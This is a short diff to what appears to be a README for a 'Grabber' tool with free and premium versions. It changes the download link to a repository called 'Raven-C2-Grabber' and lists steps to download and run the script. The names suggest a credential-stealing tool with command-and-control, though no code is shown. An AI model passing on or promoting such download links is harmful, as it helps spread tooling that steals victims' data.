@@ -31,7 +31,7 @@ This version of Grabber is free and the difference with the premium version is t
 
 2. Download Script
 
-> Donwload  From : [Link](https://github.com/mss-d3f417/D3F417-Tank-Bazi/archive/refs/heads/main.zip)
+> Donwload  From : [Link](https://github.com/mss-d3f417/Raven-C2-Grabber)
 
  3. Run Script 🥷
 
